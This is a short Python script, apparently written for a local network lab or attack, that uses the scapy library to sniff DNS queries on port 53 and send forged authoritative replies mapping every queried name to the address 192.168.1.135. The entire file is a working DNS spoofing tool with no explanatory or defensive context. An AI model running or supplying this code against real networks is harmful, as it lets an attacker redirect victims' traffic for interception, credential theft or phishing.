#!/usr/bin/python
from scapy.all import *
def dnspoo(pkt):
	try:
		if pkt.haslayer(DNS):
			spoof_ip = "192.168.1.135"
			spoof_pkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, aa=1, qr=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=spoof_ip))
			send(spoof_pkt)
			print spoof_pkt.summary()
	except Exception as ex:
		print ex

sniff(filter="udp port 53", prn=dnspoo, store=0,iface="eth1")
